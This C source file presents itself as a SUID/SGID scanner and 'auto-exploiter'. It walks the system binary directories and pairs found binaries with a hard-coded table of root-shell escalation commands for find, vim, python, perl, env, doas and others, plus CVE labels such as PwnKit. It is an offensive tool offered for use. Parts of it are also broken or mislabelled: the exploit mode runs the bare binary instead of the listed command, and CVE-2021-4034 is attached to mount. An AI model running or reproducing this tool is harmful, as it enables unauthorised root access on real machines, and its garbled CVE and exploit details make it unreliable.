// suid_exploiter.c - SUID/SGID finder + auto-exploiter
// Compile: gcc -o suidfinder suid_exploiter.c -Wall
// Run:     ./suidfinder          # dry run
//          sudo ./suidfinder -x   # auto-exploit if vulnerable found

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <libgen.h>

typedef struct {
    char *path;
    char *cve;
    char *exploit_cmd;
} exploit_t;

// Most common exploitable SUID binaries (updated 2025)
exploit_t exploits[] = {
    {"/usr/bin/find",            NULL, "find . -exec /bin/sh -p \\; -quit"},
    {"/usr/bin/vim",             NULL, "vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'"},
    {"/usr/bin/vim.basic",       NULL, "vim.basic -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'"},
    {"/usr/bin/vi",              NULL, "vi -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'"},
    {"/usr/bin/nano",            NULL, "nano -s /bin/sh\n#!/bin/sh\n/bin/sh -p"},
    {"/usr/bin/python",          NULL, "python -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"},
    {"/usr/bin/python3",         NULL, "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh -p\")'"},
    {"/usr/bin/perl",            NULL, "perl -e 'exec \"/bin/sh -p\";'"},
    {"/usr/bin/ruby",            NULL, "ruby -e 'exec \"/bin/sh -p\"'"},
    {"/usr/bin/env",             NULL, "env /bin/sh -p"},
    {"/bin/mount",               "CVE-2021-4034", "mount -o bind /bin/sh /tmp/sh && /tmp/sh -p"},
    {"/usr/bin/sudo",            NULL, "sudo /bin/sh -p"}, // if sudoedit misconfig
    {"/usr/bin/passwd",          NULL, "passwd\nroot\nroot\n"}, // rare misconfig
    {"/usr/sbin/exim4",          "CVE-2020-28018", NULL},
    {"/usr/bin/pkexec",          "CVE-2021-4034", NULL}, // PwnKit
    {"/usr/bin/doas",            NULL, "doas -u root /bin/sh"},
    {"/snap/snapd",              "Dirty Sock", NULL},
    {NULL, NULL, NULL}
};

// Safe/false-positive paths to ignore
char *ignore_prefix[] = {"/snap/", "/usr/lib/", "/usr/share/", "/var/lib/snapd/", NULL};

int should_ignore(const char *path) {
    for (int i = 0; ignore_prefix[i]; i++) {
        if (strncmp(path, ignore_prefix[i], strlen(ignore_prefix[i])) == 0)
            return 1;
    }
    return 0;
}

void check_and_exploit(const char *path, int auto_exploit) {
    for (int i = 0; exploits[i].path; i++) {
        if (strcmp(path, exploits[i].path) == 0) {
            printf("[!] EXPLOITABLE → %s", path);
            if (exploits[i].cve) printf(" (%s)", exploits[i].cve);
            printf("\n    → %s\n", exploits[i].exploit_cmd ? exploits[i].exploit_cmd : "Known exploit exists");

            if (auto_exploit && exploits[i].exploit_cmd) {
                printf("[*] Spawning root shell in 3 seconds (Ctrl+C to cancel)...\n");
                sleep(3);
                printf("[#] Enjoy your root shell:\n\n");
                execl(path, basename((char*)path), NULL);
            }
        }
    }
}

void scan_dir(const char *dirpath, int auto_exploit) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *ent;
    char path[4096];

    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirpath, ent->d_name);

        struct stat st;
        if (lstat(path, &st) < 0) continue;

        if (S_ISDIR(st.st_mode)) {
            scan_dir(path, auto_exploit);
        } else if (S_ISREG(st.st_mode)) {
            if ((st.st_mode & S_ISUID) || (st.st_mode & S_ISGID)) {
                if (should_ignore(path)) continue;

                printf("%s %s %s %s\n",
                    (st.st_mode & S_ISUID) ? "SUID" : "    ",
                    (st.st_mode & S_ISGID) ? "SGID" : "    ",
                    path,
                    (st.st_uid == 0) ? "(root)" : "");

                check_and_exploit(path, auto_exploit);
            }
        }
    }
    closedir(dir);
}

int main(int argc, char **argv) {
    int auto_exploit = 0;
    if (argc > 1 && strcmp(argv[1], "-x") == 0) {
        auto_exploit = 1;
        printf("[!] Auto-exploit mode enabled - will drop root shell if vulnerable binary found\n\n");
    }

    printf("SUID/SGID Finder + Auto-Exploiter (2025)\n");
    printf("Scanning common paths...\n\n");
    printf("Type   Path\n");
    printf("─────────────────────────────────────────────\n");

    char *paths[] = {"/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", NULL};
    for (int i = 0; paths[i]; i++) {
        scan_dir(paths[i], auto_exploit);
    }

    if (!auto_exploit) {
        printf("\nTip: Run with -x to automatically exploit known vulnerable SUID binaries\n");
    }

    return 0;
}
